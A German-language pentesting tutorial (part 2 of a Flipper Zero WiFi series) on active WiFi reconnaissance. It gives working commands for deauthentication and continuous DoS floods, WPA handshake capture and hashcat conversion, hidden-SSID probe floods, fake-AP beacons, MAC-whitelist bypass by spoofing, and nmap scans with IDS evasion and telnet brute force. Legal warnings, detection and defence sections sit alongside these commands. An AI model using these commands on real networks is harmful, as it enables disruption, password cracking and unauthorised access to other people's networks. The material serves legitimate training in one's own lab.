# Teil 2: Active WiFi Reconnaissance
## Flipper Zero WiFi Dev Board Pentesting Tutorial

---

## Inhaltsverzeichnis

1. [Einführung zu Active Reconnaissance](#1-einführung-zu-active-reconnaissance)
2. [Deauthentication Attacks](#2-deauthentication-attacks)
3. [WPA Handshake Capturing](#3-wpa-handshake-capturing)
4. [Active Probing und SSID Discovery](#4-active-probing-und-ssid-discovery)
5. [MAC Address Spoofing](#5-mac-address-spoofing)
6. [Nmap für WiFi-Netzwerke](#6-nmap-für-wifi-netzwerke)
7. [Erweiterte Kismet Features](#7-erweiterte-kismet-features)
8. [Praktische Übungen](#8-praktische-übungen)
9. [Command Cheatsheet](#9-command-cheatsheet)

---

## 1. Einführung zu Active Reconnaissance

### Unterschied: Passive vs. Active

**Passive Reconnaissance (Teil 1):**
- Wir lauschen nur
- Senden keine Pakete
- Schwer zu detektieren
- Begrenzte Informationen

**Active Reconnaissance (Teil 2):**
- Wir senden Pakete
- Provozieren Antworten
- Detektierbar (IDS/IPS kann uns sehen)
- Deutlich mehr Informationen
- Mehr Risiko, mehr Belohnung

### Was können wir aktiv tun?

**Discovery:**
- Hidden SSIDs forciert aufdecken
- Spezifische AP-Informationen abfragen
- Client-Geräte provozieren

**Manipulation:**
- Clients vom AP trennen (Deauth)
- Traffic umleiten
- Handshakes erzwingen

**Scanning:**
- Port-Scans über WiFi
- Service-Enumeration
- Schwachstellen-Checks

### Rechtliche Warnung ⚠️

**KRITISCH - BITTE LESEN:**

Active Reconnaissance kann als **Angriff** gewertet werden, selbst wenn du nichts kaputt machst:

**Legal:**
- ✅ In deinem eigenen Netzwerk
- ✅ Mit schriftlicher Autorisierung des Netzwerk-Besitzers
- ✅ In isolierten Test-Umgebungen

**Illegal:**
- ❌ Fremde Netzwerke ohne Erlaubnis
- ❌ Öffentliche WiFi-Hotspots (außer mit Betreiber-Genehmigung)
- ❌ Nachbar-WLANs
- ❌ Firmen-Netzwerke ohne IT-Abteilungs-Approval

**Konsequenzen bei Missbrauch:**
- Strafanzeige wegen Computersabotage
- Schadensersatz
- Haftstrafen möglich
- Verlust des Jobs / Ausbildungsplatzes

**Best Practice:**
- Dokumentiere deine Autorisierung
- Teste nur in Zeitfenstern die abgesprochen sind
- Informiere andere Netzwerk-Nutzer
- Halte Logs für Nachvollziehbarkeit

### Was ist ein IDS/IPS?

**IDS (Intrusion Detection System):**
- Überwacht Netzwerk-Traffic
- Erkennt verdächtige Aktivitäten
- Alarmiert Administrator
- Passive Überwachung

**IPS (Intrusion Prevention System):**
- Wie IDS, aber aktiv
- Blockiert verdächtigen Traffic
- Kann dich automatisch aussperren
- Aktive Verteidigung

**Was können sie erkennen?**
- Ungewöhnlich viele Probe Requests
- Deauthentication Floods
- Port-Scans
- MAC-Adress Spoofing
- Abnormale Paket-Raten

**In deinem Heimnetzwerk:**
- Consumer-Router haben meist kein IDS/IPS
- Aber moderne können Deauth-Protection haben
- Enterprise-Netzwerke haben definitiv Überwachung

---

## 2. Deauthentication Attacks

### Theorie: Was ist ein Deauth Frame?

**Normale Verwendung:**
- AP oder Client will Verbindung beenden
- Sendet "Deauthentication" Frame
- Grund-Codes: Inaktivität, AP shutdown, etc.
- Legitimer Teil des 802.11 Protokolls

**Problem:**
- Deauth Frames sind **nicht authentifiziert** (bei WPA2)
- Jeder kann sie senden
- Empfänger vertraut dem Frame
- Client wird getrennt

**Angriffs-Szenario:**
1. Angreifer sendet Deauth im Namen des APs zum Client
2. Client denkt AP hat ihn getrennt
3. Client versucht neu zu verbinden
4. Dabei: **4-Way-Handshake** wird ausgetauscht
5. Angreifer captured Handshake für Offline-Attack

**WPA3 Lösung:**
- Management Frame Protection (MFP / 802.11w)
- Deauth Frames werden authentifiziert
- Gefälschte Deauths werden ignoriert
- Aber: Noch nicht überall implementiert

### Deauth mit aireplay-ng

**Voraussetzung:**
- Interface in Monitor Mode
- Kenntnis der Ziel-MACs

**Basic Syntax:**
```bash
aireplay-ng --deauth <anzahl> -a <AP_MAC> -c <CLIENT_MAC> <interface>
```

**Parameter:**
- `--deauth <anzahl>`: Wie viele Deauth-Pakete (0 = endlos)
- `-a <AP_MAC>`: MAC des Access Points (BSSID)
- `-c <CLIENT_MAC>`: MAC des Clients (optional, ohne = broadcast an alle)
- `<interface>`: wlan0 (in Monitor Mode)

### Praktische Anwendung

#### Schritt 1: Target identifizieren

**Starte airodump-ng um Target zu finden:**
```bash
# Monitor Mode aktivieren (falls nicht schon aktiv)
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Scan starten
airodump-ng wlan0

# Notiere:
# - BSSID (AP MAC): z.B. AA:BB:CC:DD:EE:FF
# - CH (Kanal): z.B. 6
# - STATION (Client MAC): z.B. 11:22:33:44:55:66

# Stoppen mit Ctrl+C
```

#### Schritt 2: Auf Target-Kanal fokussieren

```bash
# Setze Interface auf spezifischen Kanal
iw dev wlan0 set channel 6

# Verifizieren
iw dev wlan0 info | grep channel
```

#### Schritt 3: Gezielter Deauth (Einzelner Client)

```bash
# Sende 10 Deauth-Pakete an spezifischen Client
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0

# Output sollte zeigen:
# 12:34:56  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
# 12:34:56  Sending 64 directed DeAuth...
# 12:34:57  Sending 64 directed DeAuth...
```

**Was passiert:**
- Client wird vom AP getrennt
- Client verbindet automatisch neu (innerhalb Sekunden)
- 4-Way-Handshake wird ausgetauscht

#### Schritt 4: Broadcast Deauth (Alle Clients)

```bash
# Ohne -c Parameter = Broadcast an alle Clients
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0

# VORSICHT: Trennt ALLE Geräte im Netzwerk!
```

**Use Cases:**
- Handshake capturing forcieren
- DoS-Test (wie reagiert Netzwerk?)
- Client-Reaktionszeit testen

#### Schritt 5: Kontinuierlicher Deauth (DoS)

```bash
# 0 = endlos, bis Ctrl+C
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0

# Stoppen: Ctrl+C
```

**⚠️ Warnung:**
- Das ist ein **Denial of Service Attack**
- Unterbricht Internet für alle
- Nur im eigenen Test-Netzwerk!
- Kann Router/AP unter Last setzen

### Deauth Detection

**Wie merkt man, dass man angegriffen wird?**

**Als Nutzer:**
- WiFi trennt sich ständig
- Reconnects alle paar Sekunden
- Schlechte Performance trotz gutem Signal

**Als Admin (Wireshark):**
```
# Filter für Deauth Frames
wlan.fc.type_subtype == 0x0c

# Ungewöhnlich viele = Angriff
```

**In airodump-ng:**
- "PWR" Spalte zeigt abnormal viele Reconnects
- "Beacons" zählt hoch, aber Clients wechseln ständig

### Schutz gegen Deauth

**WPA3 mit MFP:**
- Aktiviere 802.11w (Management Frame Protection)
- Moderne Router unterstützen das
- In Router-Settings: "PMF" oder "MFP" aktivieren

**WPA2 Workarounds:**
- Client-seitig: Ignoriere Deauths (manche Treiber können das)
- IDS installieren (erkennt abnormale Deauth-Raten)
- MAC-Filtering (hilft nicht wirklich, aber layer of defense)

**Monitoring:**
```bash
# Auf dem Flipper: Deauths live überwachen
tcpdump -i wlan0 -e -s 256 type mgt subtype deauth

# Oder mit tshark:
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x0c"
```

---

## 3. WPA Handshake Capturing

### Theorie: Der 4-Way-Handshake

**Was ist ein Handshake?**

Wenn ein Client sich mit WPA/WPA2-PSK AP verbindet, findet ein 4-Wege-Austausch statt:

```
Client                    AP
  |                        |
  |<--- (1) ANonce --------|  AP sendet Nonce
  |                        |
  |---- (2) SNonce ------->|  Client sendet Nonce + MIC
  |                        |
  |<--- (3) GTK + MIC -----|  AP sendet Group Key
  |                        |
  |---- (4) ACK -----------|>  Client bestätigt
```

**Was wird ausgetauscht:**
- **ANonce:** Random Number vom AP
- **SNonce:** Random Number vom Client  
- **MIC (Message Integrity Check):** Hash mit Passwort-Ableitung
- **GTK (Group Temporal Key):** Für Broadcast/Multicast

**Warum ist das interessant?**
- MIC enthält Hash des Passworts
- Können wir Handshake capturen
- Dann offline Brute-Force/Dictionary-Attack möglich
- Kein Netzwerk-Zugriff nötig für Crack-Versuch

**Was wir brauchen:**
- Mindestens Messages 1, 2 (idealerweise alle 4)
- BSSID (AP MAC)
- Client MAC
- ESSID (Netzwerk-Name)

### Handshake Capture mit airodump-ng

#### Setup: Zweite SSH-Session

Wir brauchen **zwei Terminal-Fenster** zum Flipper:

**Terminal 1:** Capture läuft
**Terminal 2:** Deauth triggern

```bash
# Auf deinem PC: Öffne 2 SSH-Verbindungen
# Terminal 1:
ssh root@192.168.178.122

# Terminal 2 (neues Fenster):
ssh root@192.168.178.122
```

#### Terminal 1: Capture starten

```bash
# Monitor Mode (falls nicht aktiv)
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Kanal setzen (z.B. 6)
iw dev wlan0 set channel 6

# Erstelle Output-Verzeichnis
mkdir -p /tmp/handshakes
cd /tmp/handshakes

# Starte targeted Capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0

# Parameter erklärt:
# -c 6                       = Kanal 6
# --bssid AA:BB:CC:DD:EE:FF  = Nur dieser AP
# -w handshake               = Output-Dateiname
# wlan0                      = Interface

# Du siehst jetzt Live-Monitor des Netzwerks
# Oben: AP-Info
# Unten: Verbundene Clients
```

**Wichtig:** Lasse das Fenster offen und laufen!

#### Terminal 2: Deauth senden

```bash
# Warte bis du im Terminal 1 einen Client siehst
# Notiere Client-MAC

# Sende Deauth
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0

# Client wird getrennt und reconnected
```

#### Terminal 1: Handshake erkennen

**Wenn Handshake captured:**
```
CH  6 ][ Elapsed: 2 mins ][ 2024-01-01 12:34 ][ WPA handshake: AA:BB:CC:DD:EE:FF
```

**Oben rechts steht: `WPA handshake: <BSSID>`**

Das bedeutet: Erfolg! 🎉

#### Capture stoppen

**Terminal 1:**
```bash
# Ctrl+C

# Dateien prüfen
ls -lh /tmp/handshakes/

# Du solltest sehen:
# handshake-01.cap
# handshake-01.csv
# handshake-01.kismet.csv
# handshake-01.kismet.netxml
```

### Handshake-Qualität verifizieren

**Mit aircrack-ng checken:**
```bash
aircrack-ng /tmp/handshakes/handshake-01.cap

# Output sollte zeigen:
#                                Aircrack-ng 1.x
#
#      [00:00:00] 1/1 keys tested (xxx.xx k/s)
#
#      Time left: --
#
#                           KEY FOUND! [ password123 ]  # Falls schwaches PW
#
#      Master Key     : ...
#      Transient Key  : ...
#      EAPOL HMAC     : ...

# Oder wenn nicht crackbar (noch):
# Opening handshake-01.cap
# Reading packets, please wait...
# 
# 1 potential targets
#
# INDEX  ESSID              BSSID              HANDSHAKE
# 1      MeinNetz           AA:BB:CC:DD:EE:FF  WPA (1 handshake)

# "1 handshake" = Gut!
# "0 handshake" = Nicht vollständig captured
```

### Handshake zur Analyse extrahieren

**Auf Mac/Windows weiterarbeiten:**

```bash
# HTTP-Server auf Flipper
cd /tmp/handshakes
python3 -m http.server 8080

# Browser: http://192.168.178.122:8080
# Download: handshake-01.cap
```

**Oder SCP (falls doch funktioniert):**
```bash
# Vom Laptop aus
scp root@192.168.178.122:/tmp/handshakes/handshake-01.cap ~/Desktop/
```

### Handshake in Wireshark analysieren

**Öffne handshake-01.cap in Wireshark**

**Filter für Handshake:**
```
eapol
```

**Du solltest sehen:**
- Message 1 of 4: Key (info)
- Message 2 of 4: Key (info, MIC)
- Message 3 of 4: Key (install, ack, MIC, encrypted)
- Message 4 of 4: Key (MIC)

**Frame Details:**
- Klicke auf "Message 2 of 4"
- Expandiere "IEEE 802.1X Authentication"
- Expandiere "Key Descriptor"
- Siehst du: Nonce, MIC, Key Data

**Das ist der goldene Handshake!** 🏆

### Handshake Format konvertieren

Für manche Cracking-Tools:

**hashcat Format:**
```bash
# Auf dem Flipper (oder später auf PC):
# Installiere hcxtools
apt-get install hcxtools  # Falls nicht vorhanden

# Konvertiere für hashcat
hcxpcapngtool -o handshake.hc22000 handshake-01.cap

# Oder für ältere hashcat Versionen:
hcxpcaptool -z handshake.hc22000 handshake-01.cap
```

**john the ripper Format:**
```bash
# Nutze aircrack-ng (kommt mit hccap2john)
aircrack-ng handshake-01.cap -J handshake_john

# Erstellt: handshake_john.hccap
```

---

## 4. Active Probing und SSID Discovery

### Theorie: Probe Requests und Responses

**Probe Request (vom Client):**
- "Kennt jemand das Netzwerk 'HomeWiFi'?"
- Broadcast oder directed
- Wird von passenden APs beantwortet

**Probe Response (vom AP):**
- "Ja, ich bin 'HomeWiFi', hier sind meine Details"
- Enthält SSID, Capabilities, Verschlüsselung

**Angriff:**
- Wir senden Probe Requests
- APs antworten (auch hidden SSIDs!)
- Sammeln detaillierte Informationen

### Hidden SSID forciert aufdecken

#### Methode 1: Mit mdk4

**mdk4 installieren (falls nicht vorhanden):**
```bash
apt-get update
apt-get install mdk4
```

**Probe Flood gegen AP:**
```bash
# Erstelle SSID-Datei mit Common Names
cat > /tmp/ssid_list.txt << EOF
default
linksys
netgear
dlink
hidden
test
admin
EOF

# Sende Probe Requests
mdk4 wlan0 p -t AA:BB:CC:DD:EE:FF -f /tmp/ssid_list.txt

# Parameter:
# p                          = Probe mode
# -t AA:BB:CC:DD:EE:FF       = Target BSSID
# -f /tmp/ssid_list.txt      = SSID wordlist
```

**Was passiert:**
- mdk4 sendet Probe Requests für jede SSID in Liste
- Wenn AP SSID ist in Liste: Probe Response
- Antwort zeigt echte SSID

#### Methode 2: Mit mdk3 (ältere Version)

```bash
mdk3 wlan0 p -t AA:BB:CC:DD:EE:FF

# Sendet random Probe Requests
```

#### Methode 3: Manuell mit scapy

**Scapy installieren:**
```bash
apt-get install python3-scapy
```

**Python Script erstellen:**
```python
#!/usr/bin/env python3
from scapy.all import *

# Target AP
target_bssid = "AA:BB:CC:DD:EE:FF"
interface = "wlan0"

# SSID Liste zum Testen
ssids = ["", "hidden", "test", "admin", "default", "linksys"]

for ssid in ssids:
    # Erstelle Probe Request
    probe = RadioTap() / \
            Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", 
                  addr2="de:ad:be:ef:ca:fe", addr3=target_bssid) / \
            Dot11ProbeReq() / \
            Dot11Elt(ID="SSID", info=ssid)
    
    # Sende
    sendp(probe, iface=interface, verbose=False)
    print(f"Sent probe for SSID: '{ssid}'")
    time.sleep(0.1)

print("Probe flooding complete. Check airodump-ng for responses.")
```

**Ausführen:**
```bash
chmod +x probe_flood.py
python3 probe_flood.py
```

**Parallel airodump-ng laufen lassen:**
```bash
# In anderem Terminal
airodump-ng wlan0 --bssid AA:BB:CC:DD:EE:FF

# Wenn SSID antwortet, siehst du den Namen!
```

### Beacon Injection (Fake AP)

**Eigenes Fake-Netzwerk broadcasten:**

```bash
# Mit mdk4
mdk4 wlan0 b -n "FakeNetwork" -c 6

# Parameter:
# b              = Beacon mode
# -n "FakeName"  = SSID
# -c 6           = Channel

# Dein Fake-AP erscheint in WiFi-Listen!
```

**Use Cases:**
- Evil Twin Vorbereitung (Teil 3)
- Honeypot (Attrappe für Angreifer)
- Testing wie Geräte reagieren

### Active Channel Scanning

**Schnelles Multi-Channel Probing:**

```bash
# Nutze iwlist (zeigt alle Channels mit Antworten)
iwlist wlan0 scan

# Oder mit iw:
iw dev wlan0 scan

# Zeigt:
# - Alle APs (auch hidden mit "")
# - Signal Strength
# - Verschlüsselung
# - Channels
```

**Vorteile gegenüber Passive:**
- Viel schneller (Sekunden statt Minuten)
- Findet auch APs die selten Beacons senden
- Zeigt unterstützte Standards (802.11n/ac/ax)

**Nachteile:**
- Sendet Pakete (erkennbar)
- Weniger Details als Kismet
- Keine Client-Info

---

## 5. MAC Address Spoofing

### Theorie: Warum MAC Spoofing?

**MAC-Adresse (Media Access Control):**
- Eindeutige Hardware-Adresse (theoretisch)
- Format: `AA:BB:CC:DD:EE:FF`
- Erste 3 Bytes = OUI (Hersteller)
- Kann in Software geändert werden

**Gründe für Spoofing:**
- Anonymität (nicht als eigenes Gerät erkennbar)
- MAC-Filter umgehen
- Als anderes Gerät ausgeben
- Pentesting (simuliere verschiedene Clients)

**Wann nützlich:**
- AP hat MAC-Whitelist
- Tarnung als legitimes Gerät
- Test wie Netzwerk auf unbekannte MACs reagiert

### MAC-Adresse ändern

#### Methode 1: Mit macchanger

**Installation:**
```bash
apt-get install macchanger
```

**Interface herunterfahren (erforderlich):**
```bash
ip link set wlan0 down
```

**MAC ändern:**

**Random MAC:**
```bash
macchanger -r wlan0

# Output:
# Current MAC:   aa:bb:cc:dd:ee:ff (vendor)
# Permanent MAC: aa:bb:cc:dd:ee:ff (vendor)
# New MAC:       de:ad:be:ef:ca:fe (unknown)
```

**Spezifische MAC:**
```bash
macchanger -m 11:22:33:44:55:66 wlan0
```

**Vendor-spezifisch (z.B. Apple):**
```bash
# macchanger hat eingebaute Vendor-Liste
macchanger -l | grep -i apple

# Wähle Apple OUI und random rest
macchanger -A wlan0  # -A = Random vendor from list
```

**MAC zurücksetzen (Original):**
```bash
macchanger -p wlan0

# Setzt auf Permanent MAC zurück
```

**Interface wieder hochfahren:**
```bash
ip link set wlan0 up
```

#### Methode 2: Manuell mit ip

```bash
# Interface down
ip link set wlan0 down

# MAC ändern
ip link set wlan0 address de:ad:be:ef:ca:fe

# Interface up
ip link set wlan0 up

# Verifizieren
ip link show wlan0
# Zeigt: link/ether de:ad:be:ef:ca:fe
```

### MAC Spoofing für Pentesting

**Szenario: MAC-Whitelist umgehen**

1. **Finde erlaubte MAC (aus Passive Recon):**
```bash
# Von vorherigem airodump-ng Scan
# Notiere Client-MAC der verbunden ist: 11:22:33:44:55:66
```

2. **Warte bis Client offline (oder deauth):**
```bash
# Optional: Deauth des Clients
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0
```

3. **Spoofing:**
```bash
ip link set wlan0 down
ip link set wlan0 address 11:22:33:44:55:66
ip link set wlan0 up
```

4. **Verbinde als dieser Client:**
```bash
# Jetzt hast du die MAC des legitimen Clients
# AP erlaubt deine Verbindung (falls nur MAC-Filter)
```

**⚠️ Warnung:**
- Zwei Geräte mit gleicher MAC = Netzwerk-Probleme
- Original-Client kann nicht mehr verbinden
- Nur in eigenem Test-Netzwerk!

### Spoofing Detection

**Wie erkennt man Spoofing?**

**Als Admin:**
- Zwei Geräte mit gleicher MAC (unmöglich in Realität)
- MAC-Hersteller passt nicht zu Gerät (z.B. "Apple" MAC an Windows-PC)
- TTL (Time To Live) unterschiedlich trotz gleicher MAC
- ARP-Antworten von verschiedenen IPs

**Tools:**
```bash
# arpwatch (erkennt MAC-Änderungen)
apt-get install arpwatch
arpwatch -i wlan0

# Logs unter: /var/log/arpwatch/
```

---

## 6. Nmap für WiFi-Netzwerke

### Voraussetzung: In Netzwerk verbunden

**Wichtig:**
- Nmap braucht Layer-3 (IP) Zugriff
- Du musst mit dem WLAN verbunden sein
- Oder: Nutze WiFi-Bridge

**Verbindung zum Test-WLAN:**
```bash
# Setze Interface zurück in Managed Mode
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up

# Verbinde mit wpa_supplicant
wpa_passphrase "MeinNetz" "passwort123" > /tmp/wpa.conf
wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf

# DHCP anfordern
dhclient wlan0

# Prüfe Verbindung
ip addr show wlan0
ping -c 3 8.8.8.8
```

### Netzwerk-Discovery

**Hosts im Netzwerk finden:**
```bash
# Ping Sweep (finde alle aktiven IPs)
nmap -sn 192.168.178.0/24

# Output:
# Nmap scan report for 192.168.178.1
# Host is up (0.0023s latency).
# MAC Address: AA:BB:CC:DD:EE:FF (TP-Link)
# 
# Nmap scan report for 192.168.178.50
# Host is up (0.015s latency).
# MAC Address: 11:22:33:44:55:66 (Apple)
```

**Was wir lernen:**
- Wie viele Geräte online
- IP → MAC Mapping
- Hersteller der Geräte

### Port Scanning über WiFi

**Standard Port Scan:**
```bash
# Top 1000 Ports scannen
nmap 192.168.178.1

# Output zeigt:
# PORT     STATE SERVICE
# 22/tcp   open  ssh
# 80/tcp   open  http
# 443/tcp  open  https
```

**Alle Ports (langsam):**
```bash
nmap -p- 192.168.178.1

# Dauert lange, scannt 1-65535
```

**Service Detection:**
```bash
nmap -sV 192.168.178.1

# Zeigt Versionen:
# 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
# 80/tcp   open  http    nginx 1.18.0
```

**OS Detection:**
```bash
nmap -O 192.168.178.1

# Versucht OS zu erkennen:
# Running: Linux 4.X|5.X
# OS details: Linux 4.15 - 5.6
```

### Aggressive Scan (alle Infos)

```bash
nmap -A 192.168.178.1

# Kombiniert:
# -sV (Service detection)
# -O  (OS detection)
# -sC (Default scripts)
# --traceroute
```

### Spezifische Schwachstellen-Checks

**Nmap Scripting Engine (NSE):**

```bash
# Liste verfügbare Scripts
ls /usr/share/nmap/scripts/ | grep -i wifi
ls /usr/share/nmap/scripts/ | grep -i router

# WiFi-spezifische Scripts
nmap --script=broadcast-dhcp-discover wlan0

# Router Standard-Credentials Check
nmap --script=http-default-accounts 192.168.178.1

# SSL/TLS Schwachstellen
nmap --script=ssl-enum-ciphers -p 443 192.168.178.1
```

### Gesamtes Netzwerk scannen

**Comprehensive Network Audit:**
```bash
# Alle Hosts, alle Services, Output speichern
nmap -sV -O -oA network_audit 192.168.178.0/24

# Erstellt 3 Dateien:
# network_audit.nmap  (normal output)
# network_audit.gnmap (greppable)
# network_audit.xml   (für weitere Analyse)
```

**Ergebnisse analysieren:**
```bash
# Auf dem Flipper
cat network_audit.nmap

# Oder auf PC kopieren und mit Browser öffnen (XML)
```

### WiFi-spezifische Scans

**IoT Device Discovery:**
```bash
# Viele IoT-Geräte haben Telnet/HTTP offen
nmap -p 23,80,8080,443 192.168.178.0/24

# Finde unsichere IoT-Devices
nmap --script=telnet-brute 192.168.178.0/24
```

**Printer/Scanner/NAS Finding:**
```bash
# Typische Ports
nmap -p 445,139,631,9100 192.168.178.0/24

# Port 445/139: SMB (File Sharing)
# Port 631: IPP (Printer)
# Port 9100: Raw Printer
```

### Stealth Scanning

**SYN Scan (stealthier):**
```bash
# Braucht root, schneller, weniger auffällig
nmap -sS 192.168.178.1
```

**Fragmentierung (IDS umgehen):**
```bash
nmap -f 192.168.178.1

# Splittet Pakete in Fragmente
```

**Decoy (Fake Sources):**
```bash
nmap -D RND:10 192.168.178.1

# Sendet Scans von 10 random IPs
# Versteckt echte Source-IP
```

---

## 7. Erweiterte Kismet Features

### Kismet mit gezieltem Capture

**Nur spezifisches Netzwerk loggen:**
```bash
# In ~/.kismet/kismet.conf:
source=wlan0:filter_mgmt=AA:BB:CC:DD:EE:FF

# Oder CLI:
kismet -c wlan0:filter_mgmt=AA:BB:CC:DD:EE:FF
```

### GPS Integration (falls vorhanden)

**Mit USB GPS (optional):**
```bash
# GPS-Gerät anschließen (z.B. USB GPS)
# In kismet.conf:
gps=serial:device=/dev/ttyUSB0,name=gps

# Startet Kismet mit GPS
kismet -c wlan0
```

**Wardriving:**
- Kismet loggt APs mit GPS-Koordinaten
- Erstellt WiFi-Karte deiner Umgebung
- Export als KML für Google Earth

### Alerts und Monitoring

**Kismet kann alarmieren bei:**
```bash
# In kismet.conf:
alert=PROBENOJOIN,5/min,1/sec
alert=DEAUTHFLOOD,10/sec,5/min
alert=BSSTIMESTAMP,10/min,1/sec
```

**Was diese Alerts erkennen:**
- PROBENOJOIN: Client probiert viele Netzwerke ohne zu verbinden (Scan)
- DEAUTHFLOOD: Viele Deauths (Angriff!)
- BSSTIMESTAMP: BSS Timestamp-Sprünge (AP-Spoofing)

### REST API nutzen

**Kismet hat REST API:**

```bash
# Von deinem Laptop (während Kismet auf Flipper läuft):
curl http://192.168.178.122:2501/system/status.json

# Authentifizierung (mit deinen Kismet-Credentials):
curl -u username:password http://192.168.178.122:2501/devices/summary/devices.json

# Gibt JSON mit allen Devices zurück
```

**Use Cases:**
- Automatisierte Scans
- Integration in eigene Tools
- Monitoring-Dashboards

### Packet Injection Testing

**Checke ob Interface Injection unterstützt:**
```bash
aireplay-ng --test wlan0

# Output sollte zeigen:
# Injection is working!
# Found X APs
```

**Injection Quality:**
```bash
# Sende Test-Frames
aireplay-ng --test wlan0 -a AA:BB:CC:DD:EE:FF

# Zeigt Success Rate
# 100% = Perfekt
# <50% = Problematisch
```

---

## 8. Praktische Übungen

### Übung 1: Handshake Capture Challenge

**Ziel:** Capture einen WPA2-Handshake deines eigenen Netzwerks.

**Schritte:**
1. Identifiziere dein WLAN (BSSID, Channel, Client)
2. Starte airodump-ng Capture
3. Sende Deauth an einen deiner Clients
4. Verifiziere Handshake-Capture
5. Analysiere in Wireshark

**Bonus:**
- Versuche ohne Deauth (warte auf natürlichen Reconnect)
- Capture Handshakes von mehreren Clients

### Übung 2: Hidden SSID Aufdecken

**Vorbereitung:**
- Konfiguriere einen Test-AP mit Hidden SSID
- Oder nutze Nachbar-WLAN (nur Passive Recon!)

**Schritte:**
1. Passive: airodump-ng finde Hidden AP (leere SSID)
2. Active: Sende Probe Requests
3. Warte auf Client-Verbindung oder Probe Response
4. Dokumentiere SSID

**Lernziel:**
- Verstehen warum "Hidden" nicht sicher ist

### Übung 3: MAC-Filter Penetration Test

**Setup:**
- Aktiviere MAC-Whitelist auf Test-Router
- Füge nur eine bekannte MAC hinzu

**Schritte:**
1. Scanne und finde erlaubte Client-MAC
2. Spoofing: Ändere deine MAC zu erlaubter MAC
3. Versuche Verbindung
4. Dokumentiere Erfolg/Misserfolg

**Bonus:**
- Was passiert wenn originaler Client zurückkommt?
- Teste mit ARP-Spoofing zusätzlich

### Übung 4: Netzwerk-Audit Bericht

**Ziel:** Erstelle vollständigen Security-Report deines WLANs.

**Schritte:**
1. Verbinde dich mit deinem WLAN
2. Nmap Scan aller Hosts
3. Identifiziere Services und Versionen
4. Suche nach offenen/unsicheren Ports
5. Erstelle Dokument mit Findings

**Report soll enthalten:**
- Netzwerk-Topologie
- Anzahl Geräte
- Offene Ports pro Gerät
- Potenzielle Schwachstellen
- Empfehlungen

### Übung 5: Deauth-Resistance Test

**Ziel:** Teste wie dein Netzwerk auf Deauth-Angriffe reagiert.

**Schritte:**
1. Baseline: Normale Verbindungs-Stabilität messen
2. Sende Single Deauth an Test-Client
3. Messe Reconnect-Zeit
4. Sende Deauth-Flood
5. Beobachte Netzwerk-Verhalten

**Dokumentiere:**
- Wie schnell reconnected Client?
- Bemerkt Router den Angriff?
- Gibt es Schutz-Mechanismen?

**Verbesserungen:**
- Aktiviere 802.11w (PMF) falls möglich
- Re-teste

### Übung 6: Evil Twin Vorbereitung (für Teil 3)

**Ziel:** Simuliere dein eigenes Netzwerk (Fake).

**Schritte:**
1. Nutze mdk4 um Fake-AP zu broadcasten
2. Gleicher SSID wie dein echtes Netz
3. Beobachte ob Geräte "sehen"
4. (NICHT verbinden lassen - nur Test!)

**Beobachtungen:**
- Erscheint Fake-AP in Client-Listen?
- Wie unterscheiden Clients zwischen Real/Fake?
- Signal-Stärke Einfluss?

---

## 9. Command Cheatsheet

### Deauthentication

```bash
# Targeted Deauth (spezifischer Client)
aireplay-ng --deauth 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0

# Broadcast Deauth (alle Clients)
aireplay-ng --deauth 10 -a <AP_MAC> wlan0

# Continuous Deauth (DoS)
aireplay-ng --deauth 0 -a <AP_MAC> wlan0

# Deauths monitoren
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x0c"
```

### Handshake Capturing

```bash
# Setup
iw dev wlan0 set channel <CH>
mkdir -p /tmp/handshakes && cd /tmp/handshakes

# Capture starten
airodump-ng -c <CH> --bssid <AP_MAC> -w handshake wlan0

# (In anderem Terminal) Deauth für Handshake
aireplay-ng --deauth 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0

# Handshake verifizieren
aircrack-ng handshake-01.cap

# Für hashcat konvertieren
hcxpcapngtool -o handshake.hc22000 handshake-01.cap
```

### Active Probing

```bash
# Hidden SSID Probe Flood
mdk4 wlan0 p -t <AP_MAC> -f /tmp/ssid_list.txt

# Beacon Injection (Fake AP)
mdk4 wlan0 b -n "FakeSSID" -c 6

# Active Scan (zeigt alle APs)
iw dev wlan0 scan | grep -i ssid
iwlist wlan0 scan
```

### MAC Spoofing

```bash
# Interface vorbereiten
ip link set wlan0 down

# Random MAC
macchanger -r wlan0

# Spezifische MAC
macchanger -m <NEW_MAC> wlan0
# Oder:
ip link set wlan0 address <NEW_MAC>

# Original MAC
macchanger -p wlan0

# Interface hochfahren
ip link set wlan0 up

# Verifizieren
ip link show wlan0
macchanger -s wlan0
```

### Nmap WiFi Scanning

```bash
# Mit WLAN verbinden (Managed Mode)
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up
wpa_passphrase "SSID" "password" > /tmp/wpa.conf
wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf
dhclient wlan0

# Ping Sweep (Host Discovery)
nmap -sn 192.168.1.0/24

# Port Scan (Single Host)
nmap 192.168.1.1
nmap -p 1-65535 192.168.1.1

# Service Detection
nmap -sV 192.168.1.1

# OS Detection
nmap -O 192.168.1.1

# Aggressive (all-in-one)
nmap -A 192.168.1.1

# Vulnerability Scripts
nmap --script=vuln 192.168.1.1

# Full Network Audit
nmap -sV -O -oA network_audit 192.168.1.0/24

# Stealth Scan
nmap -sS -f 192.168.1.1
```

### Kismet Advanced

```bash
# Start mit Filter (nur spezifisches Netzwerk)
kismet -c wlan0:filter_mgmt=<AP_MAC>

# Mit Config-File
kismet --config-file=/path/to/custom_kismet.conf

